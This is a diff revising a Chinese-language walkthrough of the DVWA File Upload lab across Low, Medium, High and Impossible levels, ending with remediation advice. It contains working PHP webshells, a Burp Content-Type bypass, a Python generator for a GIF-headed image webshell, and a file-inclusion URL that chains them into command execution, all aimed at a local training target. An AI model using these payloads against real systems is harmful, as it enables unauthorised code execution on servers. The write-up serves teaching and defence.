@@ -1,282 +1,147 @@
-# File Upload文件上传
-### 核心问题:
-```HTML
-应用允许用户上传文件，但没有正确限制文件类型、文件内容、文件名、存储路径或执行权限，导致攻击者可以上传可执行脚本并访问执行。
-```
-# LOW等级实操
-### 特点
-1. 不检查文件后缀
-2. 不检查 MIME-Type
-3. 不检查文件内容
-4. 上传后文件直接放到 Web 可访问目录
-5. PHP 文件可被服务器解析执行
+# File Upload
 
-## 上传PHP测试文件
-1. 新建文件：
-```html
-info.php
+头像上传。服务器收下文件、存进 Web 目录，但没管它是什么东西。上传的脚本能被浏览器直接访问，也能被 PHP 解析执行，问题就在这里。
+
+有漏洞的那一行大概长这样：
+
+```php
+move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
 ```
-2. 内容:
-```html
+
+`$target_path` 直接写在 `hackable/uploads/` 下面，没有任何校验。
+
+## Low
+
+后缀、类型、内容一样都不查。
+
+先传一个探针，确认 PHP 会被执行：
+
+```php
 <?php phpinfo(); ?>
 ```
-3. 上传info.php
-4. 如果上传成功，访问
->http://127.0.0.1/dvwa/hackable/uploads/info.php
-如果页面显示 PHP 配置信息，说明 PHP 文件被成功执行。
-效果图:<img src='low1.png'>
 
-## 上传简单命令执行文件
-1. 新建文件:
-```javascript
-shell.php
-```
-2. 内容 
-```html
-<?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
-```
-3. 上传后访问：
->http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
-4. 可能返回类似：
->www-data
-<img src='low2.png'>
-5. 再测试
->http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=id
-6. 在windows环境中可以测试
->http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
+存成 `info.php` 上传，访问 `http://127.0.0.1/dvwa/hackable/uploads/info.php`。页面出来一整页 PHP 配置信息，说明服务器把它当 PHP 执行了，而不是当文本读。
 
-## low等级学习重点
-1. 文件上传漏洞的基本危害
-2. WebShell 的基本原理
-3. 上传目录可访问的风险
-4. PHP 文件解析执行条件
-5. move_uploaded_file() 如果没有安全限制会产生的问题
-6. 文件后缀名控制的重要性
+![phpinfo 执行成功](low1.png)
 
-# Medium等级实操
-### 常见逻辑是检查:
->$_FILES['uploaded']['type']
-通常只允许
-```html
-image/jpeg
-image/png
-```
-**但是问题在于**
->MIME-Type 是客户端可控的，攻击者可以通过 Burp Suite 修改。
-## 直接上传php文件
-准备
-1. info.php
-2. 内容是<?php phpinfo(); ?>
-3. 通常会失败，显示类似：Your image was not uploaded.
-4. 原因是浏览器提交的content-type可能是:
-```html
-application/x-php
-application/octet-stream
-```
-不符合服务端要求
-## 使用 Burp Suite 绕过 MIME-Type 检查
-1. 浏览器代理设置为:
->127.0.0.1:8080,burp suite 开启intercept
-2. 选择php文件上传:shell.php
-burp会拦截到类似请求
-```html
-POST /dvwa/vulnerabilities/upload/ HTTP/1.1
-Host: 127.0.0.1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+再换成能带参数执行的一条：
 
-------WebKitFormBoundary
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+访问 `...uploads/shell.php?cmd=whoami`，回显 `www-data`（Windows 下会是别的账号）。这一条就够说明危害了：任意命令，权限跟 Web 服务一致。
+
+![执行 whoami](low2.png)
+
+很多人到这一步就停了，其实还该看两件事：上传目录能不能列目录、上传的文件有没有被重命名。DVWA 里都是原始文件名，所以能直接猜路径。
+
+## Medium
+
+Medium 查了 `$_FILES['uploaded']['type']`，只放 `image/jpeg` 和 `image/png`。
+
+这个值是浏览器随请求一起发上来的，属于客户端数据，改一下就过。默认直接传 `shell.php` 会失败，提示 `Your image was not uploaded.`，因为浏览器给的类型是 `application/x-php`。
+
+Burp 拦下 multipart 请求，只改一行：
+
+```
 Content-Disposition: form-data; name="uploaded"; filename="shell.php"
-Content-Type: application/x-php
-
-<?php phpinfo(); ?>
-------WebKitFormBoundary
-Content-Disposition: form-data; name="Upload"
-
-Upload
-------WebKitFormBoundary--
+Content-Type: application/x-php      ← 改成 image/jpeg
 ```
-3. 修改content-Type
->将Content-Type: application/x-php ->Content-Type: image/jpeg
-修改后类似
-```html
-Content-Disposition: form-data; name="uploaded"; filename="shell.php"
-Content-Type: image/jpeg
 
-<?php phpinfo(); ?>
+![改 Content-Type](medium1.png)
+
+再放行，文件落地。这一步的本质是"把文件在请求里伪装成图片"，服务端读的是请求头里的声明，不是文件本身。
+
+顺带记一句：`$_FILES['file']['type']` 这一整个字段都不可信，它来自客户端。判断文件类型要看 `finfo_file()` 读出来的真实内容。
+
+## High
+
+High 开始查真东西：后缀白名单、文件大小、还有 `getimagesize()`。前两个好理解，`getimagesize()` 是读文件头，判断是不是一张结构合法的图片。
+
+到这一步流程变了：
+
+| 试法 | 结果 | 原因 |
+|---|---|---|
+| 传 `info.php` | 失败 | 后缀不在白名单 |
+| 传 `shell.php.jpg` | 失败 | 后缀对了，但内容不是合法图片 |
+| 传正常 `normal.jpg` | 成功 | 没问题，但只是一张图 |
+| 传图片马 | 成功上传 | 但直接访问不执行 |
+
+关键结论：**High 下单独的文件上传拿不到代码执行**。图片能传上去，Web 服务器也默认不会把 `.jpg` 当 PHP 解析。
+
+要真执行，得配合文件包含。DVWA 的 File Inclusion 模块正好也在，两个一拼就通了。
+
+### 图片马
+
+思路是造一个文件，既能让 `getimagesize()` 认出来是图片，尾部又带 PHP 代码。用 Python 拼最省事：
+
+```python
+from pathlib import Path
+
+gif_header = (
+    b"GIF89a"
+    b"\x01\x00\x01\x00\x80\x00\x00"
+    b"\x00\x00\x00\xff\xff\xff"
+    b",\x00\x00\x00\x00\x01\x00\x01\x00\x00"
+    b"\x02\x02D\x01\x00;"
+)
+
+php_payload = b'''<?php
+if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
+else { echo "usage: ?page=file:///path/to/123.jpg&cmd=whoami"; }
+'''
+
+out = Path(r"D:/phpstudy_pro/File Upload/123.jpg")
+out.parent.mkdir(parents=True, exist_ok=True)
+out.write_bytes(gif_header + php_payload)
+print(out, out.stat().st_size)
 ```
-<img src='medium1.png'>
 
-**这里解释一下，上传Php文件的时候，请求里是Content-Type: application/x-php,服务器看到后，认为是PHP文件，于是拒绝上传，把Content-Type: application/x-php ->Content-Type: image/jpeg,是你再请求中把这个文件伪装成jpeg图片文件**
+生成的是 `.jpg` 后缀，但文件头是合法 GIF。`getimagesize()` 认的是内容，所以能过。
 
-4. 访问上传文件
+上传成功后文件落在 `hackable/uploads/123.jpg`。
 
->如果上传成功，访问：
-```html
-http://127.0.0.1/dvwa/hackable/uploads/shell.php
+![图片马上传成功](high2.png)
+
+### 用文件包含把它执行起来
+
+File Inclusion 的 High 允许 `file*` 开头的参数，正好能用 `file://` 包装器。构造：
+
 ```
-如果显示phpinfo()页面，说明绕过成功
-
-## 如果上传的是:
-```html
-<?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA/hackable/uploads/123.jpg&cmd=whoami
 ```
-访问
->http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
 
-## Medium等级学习重点
-1. MIME-Type 校验不可靠
-2. $_FILES['file']['type'] 来自客户端，不可信
-3. Burp Suite 修改 multipart 请求
-4. 服务端必须基于文件真实内容进行校验
-5. 上传文件不能仅依赖前端或请求头判断
-6. 文件扩展名和文件内容都需要校验
+`include` 读文件时会把文件里的 `<?php ... ?>` 当代码解析，图片头是二进制垃圾，PHP 输出的时候直接原样吐出去，不影响后面的代码执行。
 
-# High等级实操
-## high等级一般会同时检查
-1. 文件扩展名
-2. 文件大小
-3. 图片真实内容
-> 并且可能使用:getimagesize()，判断是否为真实图片，因此直接上传info.php，通常会失败
-### 上传正常照片
-1. 准备normal.jpg上传
-2. 通常可以成功
-3. 访问http://127.0.0.1/dvwa/hackable/uploads/normal.jpg
-4. 可以看到图片
-### 上传php图片
-1. 准备shell.php
-2. 内容为<?php phpinfo(); ?>
-3. 通常失败
-4. 原因：后缀不是 jpg/jpeg/png，内容不是合法图片
-### 尝试双后缀绕过
-1. 将文件名改为：shell.php.jpg
-2. 内容仍然是<?php phpinfo(); ?>
-3. 一般仍会失败，因为 getimagesize() 检测不到合法图片结构。
-### 制作图片马
-1. copy /b normal.jpg + payload.php sheell.jpg
-2. 上传shell.jpg
-3. High登记下通常可能上传成功,因为
-```html
-后缀是 .jpg
-文件头是图片格式
-getimagesize() 可以识别
-```
-4. 上传后访问http://127.0.0.1/dvwa/hackable/uploads/shell.jpg
-5. 此时大概率只会显示图片或乱码，不会执行Php
-6. web服务器默认不会吧.jpg当做php执行
-7. 所有在high等级中，仅上传图片马通常无法直接获得代码执行.
+![组合利用成功](high.png)
 
-# 与 File Inclusion 模块组合利用
-High等级的File Upload本身通常不能直接执行图片中的PHP代码，但是如果站点还存在文件包含漏洞，例如本靶场的，就可以，思路如下
-1. 通过 File Upload 上传包含 PHP 代码的图片马，例如 shell.jpg
-2. 通过 File Inclusion 包含该图片文件
-3. PHP 解释器在 include 文件时，会解析其中的 <?php ... ?> 代码
-4. 从而触发代码执行
-# 具体实操过程
->首先，你需要知道,high难度进行了过滤，所有图片马需要满足:
-1. 图片名后缀必须是jpg/png/jpeg
-2. 文件本身必须是真实图片，能通过getimagesize
-3. 图片里必须追加PHP代码
-4. 上传到DVWA的hackable/uploads/
-5. 再用File Inclusion的file://本地文件包装器包含他
-OK那么实践开始
-1. 新建文件123.py
-2. 然后粘贴下面代码：
-```html
- from pathlib import Path
+![文件包含那一步](high1.png)
 
+这条链子值得记牢：**单独一个上传高危但不致命，单独一个包含也未必能执行，两个凑一起就是 RCE**。真实环境里这种组合很常见，渗透的时候看到一个上传点别急着放弃。
 
-  def make_image_shell(output_path: str) -> None:
-      """
-      生成一个文件名为 .jpg，但内容是合法 GIF 图片的图片马。
-      可用于 DVWA File Upload High + File Inclusion High 本地实验。
-      """
+## Impossible 为什么打不进去
 
-      # 一个 1x1 像素的最小合法 GIF 图片
-      gif_header = (
-          b"GIF89a"
-          b"\x01\x00\x01\x00\x80\x00\x00"
-          b"\x00\x00\x00\xff\xff\xff"
-          b",\x00\x00\x00\x00\x01\x00\x01\x00\x00"
-          b"\x02\x02D\x01\x00;"
-      )
+1. 后缀白名单（只放 jpg/png/gif）
+2. `getimagesize()` 校验
+3. 用 `imagecreatefromjpeg()` 重新编码，图片马里的 PHP 代码在这一步被整体重写掉
+4. 随机文件名，不保留用户原文件名
+5. 上传目录不给执行权限
+6. 加 CSRF token、限制大小
 
-      # PHP payload
-      # 注意：这里故意不写 PHP 结束标签 ?>，这样更稳定，避免后面内容干扰解析
-      php_payload = b'''<?php
-  echo "<br><pre>";
-  echo "include ok\\n";
+第 3 条是决定性的。前面所有绕过都是"让文件通过检查但保留 payload"，重新编码直接把文件解成像素再生成一张新图，payload 无处可藏。
 
-  if (isset($_GET["cmd"])) {
-      system($_GET["cmd"]);
-  } else {
-      echo "Usage: ?page=file:///path/to/123.jpg&cmd=whoami";
-  }
+## 我卡住的地方
 
-  echo "</pre>";
-  '''
+- Medium 第一次改错了位置，改的是请求头里的 `Content-Type: multipart/form-data`，那是整个表单的类型，不是文件的。要改的是 `Content-Disposition` 那一段下面、文件名后面的那个 `Content-Type`。
+- 图片马一开始用 `copy /b` 拼，拼出来的文件 `getimagesize()` 能过但上传被拒。后来发现是我拿的 jpg 本身就有问题，换成手写 GIF 头才稳定。
+- 上传成功后直接访问 `123.jpg` 只看到一堆乱码，当时以为失败。其实那说明文件在，只是 Web 服务器不解析 jpg，要配合包含才行。
 
-      output_file = Path(output_path)
+## 怎么修
 
-      # 如果目标目录不存在，自动创建
-      output_file.parent.mkdir(parents=True, exist_ok=True)
-
-      # 写入图片马
-      output_file.write_bytes(gif_header + php_payload)
-
-      print(f"[+] Created: {output_file}")
-      print(f"[+] Size: {output_file.stat().st_size} bytes")
-      print("[+] Done.")
-
-
-  if __name__ == "__main__":
-      # 这里改成你想保存的位置
-      # 建议先保存到 D:/phpstudy_pro/File Upload/123.jpg，然后用 DVWA Upload 页面上传
-      make_image_shell(r"D:/phpstudy_pro/File Upload/123.jpg")
-```
-3. 运行后会生成D:/phpstudy/File Upload/123.jpg
-4. 然后去file upload high页面上传这个123.jph
-5. 上传成功后，一般会保存到 D:/phpstudy_pro/WWW/DVWA/hackable/uploads/123.jpg
-6. 根据file inclusion模块high难度的特性(上一个文件中有上传的通关报告)
-
-<img src='high1.png'>
-
-7. 由此可以构造URL链接http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA/hackable/uploads/123.jpg
-8. 效果图<img src='high.png'>
-High等级学习重点
-1. 后缀名白名单的重要性
-2. 图片真实内容检测
-3. getimagesize() 的作用与局限
-4. 图片马原理
-5. 单一防御措施不足
-6. 文件上传 + 文件包含组合利用
-7. Web 服务器解析规则的重要性
-8. 为什么上传目录不能执行脚本
-
-
-# Impossible等级
-1. 严格检查文件扩展名
-2. 检查 MIME-Type
-3. 检查真实图片内容
-4. 对图片重新编码
-5. 使用随机文件名
-6. 不保留用户原始文件名
-7. 防止图片马中的 PHP 代码保留
-8. 加强 CSRF 防护
-9. 限制文件大小
-10. 对上传过程做更严格处理
-
-# 四种情况对比
-| 安全等级 | 校验方式 | 是否可直接上传 PHP | 是否容易执行 | 学习重点 |
-|---|---|---|---|---|
-| Low | 几乎无校验 | 可以 | 可以 | 上传漏洞基本原理 |
-| Medium | 检查 MIME-Type | 可绕过 | 可以 | MIME-Type 不可信 |
-| High | 后缀 + 图片内容检测 | 较难 | 通常不能直接执行 | 图片马、漏洞组合 |
-| Impossible | 多重校验 + 重编码 | 基本不可行 | 基本不可行 | 安全防御方案 |
+1. 后缀白名单，不要黑名单。
+2. 用 `finfo_file()` 读真实类型，不看请求头。
+3. 图片类上传统一重新编码（`imagecreatefrom*` + `image*` 重新输出），丢掉所有原始字节。
+4. 重命名成随机串，不保留原文件名，也不保留后缀里的第二个点。
+5. 上传目录 `php_admin_flag engine off`，或者干脆放到 Web 根目录之外，用脚本读文件流输出。
+6. 大小限制 + CSRF token。
